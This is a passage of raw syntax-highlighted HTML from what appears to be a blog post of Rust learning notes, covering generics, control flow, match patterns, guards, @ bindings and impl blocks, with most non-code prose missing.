operator\">&gt;</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">U</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// where</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">some_function</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">U</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">U</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">i32</span>\n    <span class=\"token keyword\">where</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Display</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Clone</span><span class=\"token punctuation\">,</span>\n          <span class=\"token class-name\">U</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Clone</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Debug</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p> <code>impl Trait</code> </p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Summary</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Breaking news! {}\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</blockquote>\n<p>// TODO</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Rust\"><a href=\"#Rust\" class=\"headerlink\" title=\"Rust\"></a>Rust</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>goif for</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// kotlin</span>\n<span class=\"token keyword\">let</span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> number <span class=\"token operator\">=</span> <span class=\"token keyword\">if</span> condition <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">5</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">6</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">let</span> n <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is not divisible by 4, 3, or 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// for</span>\n<span class=\"token comment\">// kt, </span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token number\">1</span><span class=\"token punctuation\">..=</span><span class=\"token number\">5</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token comment\">// container</span>\n<span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> <span class=\"token operator\">&amp;</span>container <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> collection <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// index</span>\n<span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// `.iter()`  `a` </span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">iter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enumerate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;&#123;&#125;\"</span><span class=\"token punctuation\">,</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//  while(true)</span>\n<span class=\"token keyword\">loop</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"again!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>rustbreak</p>\n<p>loop</p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<p>rust</p>\n</blockquote>\n<h3 id=\"match\"><a href=\"#match\" class=\"headerlink\" title=\"match\"></a>match</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// switch</span>\n<span class=\"token comment\">// matchswitch</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Coin</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Penny</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Nickel</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Dime</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">value_in_cents</span><span class=\"token punctuation\">(</span>coin<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">u8</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">match</span> coin <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Penny</span> <span class=\"token operator\">=></span>  <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Lucky penny!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token number\">1</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Nickel</span> <span class=\"token operator\">=></span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Dime</span> <span class=\"token operator\">=></span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quarter</span> <span class=\"token operator\">=></span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// match</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">IpAddr</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token class-name\">Ipv4</span><span class=\"token punctuation\">,</span>\n   <span class=\"token class-name\">Ipv6</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> ip1 <span class=\"token operator\">=</span> <span class=\"token class-name\">IpAddr</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ipv6</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> ip_str <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> ip1 <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">IpAddr</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ipv4</span> <span class=\"token operator\">=></span> <span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span>\n        _ <span class=\"token operator\">=></span> <span class=\"token string\">\"::1\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> ip_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//  </span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Coin</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Penny</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Nickel</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Dime</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UsState</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 25</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">value_in_cents</span><span class=\"token punctuation\">(</span>coin<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">u8</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">match</span> coin <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Penny</span> <span class=\"token operator\">=></span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Nickel</span> <span class=\"token operator\">=></span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Dime</span> <span class=\"token operator\">=></span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n        <span class=\"token comment\">// state</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"State quarter from &#123;:?&#125;!\"</span><span class=\"token punctuation\">,</span> state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token number\">25</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//  match </span>\n<span class=\"token keyword\">let</span> v <span class=\"token operator\">=</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">match</span> v <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n   _ <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">if</span> <span class=\"token keyword\">let</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>match_ &#x3D;&gt;</p>\n</blockquote>\n<h3 id=\"matches-\"><a href=\"#matches-\" class=\"headerlink\" title=\"matches!\"></a>matches!</h3><blockquote>\n<p>javaString#matchesmacth,matches!</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// match</span>\n<span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token char string\">'f'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> matched <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> foo <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token char string\">'A'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'Z'</span> <span class=\"token operator\">|</span> <span class=\"token char string\">'a'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'z'</span> <span class=\"token operator\">=></span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    _ <span class=\"token operator\">=></span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// matches!</span>\n<span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token char string\">'f'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> matched <span class=\"token operator\">=</span> <span class=\"token macro property\">matches!</span><span class=\"token punctuation\">(</span>foo<span class=\"token punctuation\">,</span> <span class=\"token char string\">'A'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'Z'</span> <span class=\"token operator\">|</span> <span class=\"token char string\">'a'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p>if condition</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">match</span> x <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Got 50\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> y <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Matched, n = &#123;&#125;\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        _ <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Default case, x = &#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"at the end: x = &#123;:?&#125;, y = &#123;&#125;\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><strong></strong></p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">match</span> x <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">4</span> <span class=\"token operator\">|</span> <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token number\">6</span> <span class=\"token keyword\">if</span> y <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    _ <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p> <code>if y</code>  <code>6</code> <code>if y</code>  <code>4</code><code>5</code> <strong></strong> <code>6</code>  <code>x</code>  <code>4 | 5 | 6</code>  <code>y</code>  <code>true</code></p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"@\"></a>@</h3><blockquote>\n<p></p>\n<p> </p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">let</span> msg <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">match</span> msg <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id<span class=\"token punctuation\">:</span> id_variable <span class=\"token operator\">@</span> <span class=\"token number\">3</span><span class=\"token punctuation\">..=</span><span class=\"token number\">7</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found an id in range: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> id_variable<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span><span class=\"token punctuation\">..=</span><span class=\"token number\">12</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found an id in another range\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">&#123;</span> id <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found some other id: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>id: 3..&#x3D;7</p>\n<p>:</p>\n<blockquote>\n<p>:</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">match</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span>\n        num <span class=\"token operator\">@</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        _ <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> <code>num</code>  <code>1</code></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\">num <span class=\"token operator\">@</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> Rust 1.53 </p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>Rust<code>impl</code></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// newCircleself</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n        <span 